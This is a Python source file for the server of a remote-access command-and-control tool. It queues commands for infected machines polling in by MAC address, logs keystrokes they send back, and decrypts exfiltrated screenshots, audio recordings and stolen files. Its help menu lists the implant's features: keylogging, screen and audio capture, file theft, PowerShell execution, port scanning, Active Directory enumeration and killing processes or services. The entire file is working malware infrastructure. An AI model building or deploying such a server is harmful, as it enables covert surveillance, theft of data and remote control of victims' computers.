import os
import threading
import time
from flask import Flask, request, jsonify
from flask_socketio import SocketIO
import base64
import datetime

import rsa

app = Flask(__name__)
socketio = SocketIO(app)

COMMANDS = {}
kill_keylogger = False

def decrypt1(encrypted):
    decrypted = ''

    for c in encrypted:
        if not c.isalpha():
            decrypted += c
            continue

        letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if c.isupper() else 'abcdefghijklmnopqrstuvwxyz'
        index = letters.index(c)
        n = (index - 6) % 26
        decrypted += letters[n]

    return decrypted

def decrypt2(encrypted):
    with open('./keys/private4.key', 'rb') as f:
        priv_key_pem = f.read()
    priv_key = rsa.PrivateKey.load_pkcs1(priv_key_pem)

    sections = encrypted.split("!!")
    decrypted = ""
    for s in sections:
        ctext = bytes.fromhex(s)
        dtext = rsa.decrypt(ctext, priv_key).decode('utf-8')
        decrypted += dtext
    
    return decrypted

def file_decryptor(encrypted):
    t1 = time.time()
    if hasattr(encrypted, 'read'):
        encrypted = encrypted.read()

    with open('./keys/private4.key', 'rb') as f:
        priv_key_pem = f.read()
    priv_key = rsa.PrivateKey.load_pkcs1(priv_key_pem)

    sections = encrypted.split(b"!!")
    decrypted = b""
    for s in sections:
        ctext = bytes.fromhex(s.decode('utf-8'))
        dtext = rsa.decrypt(ctext, priv_key)
        decrypted += dtext

    # Decode the decrypted bytes from base64
    decoded_decrypted = base64.b64decode(decrypted)

    total = time.time() - t1
    print(f"Decryption took {total} seconds")
    return decoded_decrypted

def physical_log(message):
    timestamp = datetime.datetime.now()
    log_entry = f"{timestamp} -- {message}\n\n"

    with open('output.log', 'a') as f:
        f.write(log_entry)

def keylogger_log(message:str):
    timestamp = datetime.datetime.now()
    log_entry = f"{timestamp} -- {message}\n\n"
    name = message.split("\n")[1].replace(":","-")
    print(f"\033[90mAppending keylogger log {name}.log\033[0m")

    with open(f'{name}.log', 'a') as f:
        f.write(log_entry)

def file_save(enc, fname):
    file = file_decryptor(enc)

    with open(os.path.join('upload', fname), 'wb') as f:
        f.write(file)

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'image' not in request.files:
        return jsonify({"error": "No file part"}), 400

    image = request.files['image']
    fname = image.filename
    mtype = image.mimetype
    
    if fname == '':
        return jsonify({"error": "No selected file"}), 400

    if not mtype.startswith('image') and not mtype.startswith('audio/wav'):
        return jsonify({"error": "Invalid file type"}), 400
    
    t = threading.Thread(target=file_save, args=[image, fname])
    t.start()
    print("Started download thread")

    return jsonify({"message": "File uploaded and decrypted successfully"}), 200

@app.route('/', methods=['GET'])
def handle_get_request():
    global COMMANDS
    mac = request.headers.get('X-MAC-Address')
    if mac not in COMMANDS.keys():
        COMMANDS[mac] = []
        print(f"Added mac: {mac}")
    timestamp = datetime.datetime.now().strftime("[%d/%b/%Y %H:%M:%S.%f]")
    print(f"\033[90m{request.base_url} -- {timestamp}\033[0m")
    if request.path == '/':
        response = '\n'.join(COMMANDS[mac])
        COMMANDS[mac].clear()
        return response, 200
    else:
        return '404 Not Found', 404

@app.route('/', methods=['POST'])
def handle_post_request():
    global kill_keylogger
    result = request.data.decode('utf-8')

    decrypted = decrypt1(result)

    if decrypted.startswith("km84"):
        keylogger_log(decrypted)
    else:
        print(decrypted)
        physical_log(decrypted)

    if decrypted.startswith("km84") and kill_keylogger:
        kill_keylogger = False
        return 'DIE', 200
    else:
        return 'Received the POST request successfully', 200

@socketio.on('message')
def handle_message(message):
    global COMMANDS, kill_keylogger

    print(f"Received message from WebSocket client: {message}")

    if message == 'help':
        help_command()
    elif message == 'clear-command-queue':
        COMMANDS.clear()
    elif message == 'list-cmd-queue':
        list_cmd_queue()
    elif message == 'kill-keylogger':
        kill_keylogger = True
        print("HERE")
    else:
        print(f"appending: {message}")
        COMMANDS.append(message)

def kill_keylogger_func():
    global kill_keylogger
    kill_keylogger = True
    print("Killing Keylogger")

def help_command():
    r = "\033[0m"
    b = "\033[1m"
    g = "\033[32m"
    red = "\033[31m"
    print(f"""Enter the device you wish to send the command to as the first word, or blank for all. Use 'list-connected' to find connected devices.
    {b}Commands:{r}
    {g}list-connected{r} : Prints all connected devices with their corresponding integer id.
    {g}cd <dir>{r}
    {g}ls{r}
    {g}mkdir <name>{r}
    {g}pwd{r}
    {g}get-users{r} : Prints all Active Directory users, groups, and names.
    {g}set-interval <int>{r} : Set the time interval between each GET request.
    {g}set-buffer <int>{r} : Sets a buffer for time intervals so it is randomized.
    {g}clear-command-queue{r} : Clears the commands you have queued before GET.
    {g}list-cmd-queue{r} : Lists the currently queued commands.
    {g}powershell <cmd>{r} : Runs the specified command through powershell. (NOTE: Powershell instance will restart after each use. Use '<cmd>; <cmd>' for one instance)
    {g}scan-ports <min> <max>{r} : Finds open ports in the specified range.
    {g}keylogger{r} : Starts the keylogger.
    {g}kill-keylogger{r} : Stops the keylogger.
    {g}screenshot{r} : Takes a screenshot and saves it into the upload folder.
    {g}screenshot <interval> <quantity>{r} : Takes and saves screenshots every interval seconds for quantity times.
    {g}audio-record <seconds>{r} : Records an audio recording for the specified length and saves it in uploads.
    {g}downloader <path> <filename>{r} : Downloads the file at the given path to the uploads folder as the given filename.
    {g}get-processes <process name>{r} : Finds and prints all processes or all processes by given name (optional).
    {g}kill <pid>{r} : Kills the process with associated pid.
    {g}kill-by-name <process name>{r} : Kills all processes with the given name (Not case sensitive).
    {g}repeat-kill-proc <process name> <rep quant> <sleep time>{r}: Repeats the kill by name process.
    {g}get-all-services <r?>{r} : View all services. Make the command 'get-all-services r' to see just running services.
    {g}stop-service <service name>{r} : Stop the service with the given name (needs admin privileges usually).
    {g}ip-add <ip>{r} : Adds an IP to the IP pool. If connection is refused 3 times, it will change the ip it tries to connect to.
    {red}MOST cmd{r} commands will work.
    """)

def list_connected():
    keys = list(COMMANDS.keys())
    for i in range(len(keys)):
        print(f"{i}: {keys[i]}")

def list_cmd_queue():
    for k in COMMANDS.keys():
        print(f"{k}: {COMMANDS[k]}")

def clear_commands(message: str):
    s = message.split(" ")
    keys = list(COMMANDS.keys())
    if s[0].isdigit():
        try:
            COMMANDS[keys[int(s[0])]].clear()
        except Exception as e:
            print(f"Error, likely invalid command number id :: {e}")
    else:
        for k in keys:
            COMMANDS[k].clear()

def cli_handler():
    while True:
        message = input("\n\033[1mEnter command:\033[0m ")
        if message.strip() == "help":
            help_command()
            continue
        elif message == "clear-command-queue": clear_commands(message)
        elif message == "list-cmd-queue": list_cmd_queue()
        elif message == "list-connected": list_connected()
        elif message == "kill-keylogger": kill_keylogger_func()
        elif message == "stop-server":
            stop_server()
            break
        else: cmd_handler(message)

def cmd_handler(message: str):
    keys = list(COMMANDS.keys())
    s = message.split(" ")
    if s[0].isdigit():
        i = int(s[0])
        if i <= len(keys):
            COMMANDS[keys[i]].append(" ".join(s[1:]))
        else: print("Invalid number id")
    else:
        for k in keys:
            COMMANDS[k].append(message)

def start():
    socketio.run(app, host="0.0.0.0", port=8000)

def stop_server():
    socketio.stop()

def asciiart():
    print("""\n██████████████████████████████████
█░░░░░░░░░░░░░░████░░░░░░░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀░░████░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░░░░░░░░░████░░░░░░░░░░▄▀░░█
█░░▄▀░░████████████████████░░▄▀░░█
█░░▄▀░░████████████░░░░░░░░░░▄▀░░█
█░░▄▀░░████████████░░▄▀▄▀▄▀▄▀▄▀░░█
█░░▄▀░░████████████░░▄▀░░░░░░░░░░█
█░░▄▀░░████████████░░▄▀░░█████████
█░░▄▀░░░░░░░░░░████░░▄▀░░░░░░░░░░█
█░░▄▀▄▀▄▀▄▀▄▀░░████░░▄▀▄▀▄▀▄▀▄▀░░█
█░░░░░░░░░░░░░░████░░░░░░░░░░░░░░█
██████████████████████████████████\n""")

if __name__ == '__main__':
    asciiart()
    print("\nIf the console colors are not working properly (i.e, seeing [32m before some text), use this command and restart powershell after:")
    print("Set-ItemProperty HKCU:\Console VirtualTerminalLevel -Type DWORD 1")
    t = threading.Thread(target=start)
    t.start()
    try:
        cli_handler()
    except KeyboardInterrupt:
        print("Closing...")
        stop_server()
    t.join()
    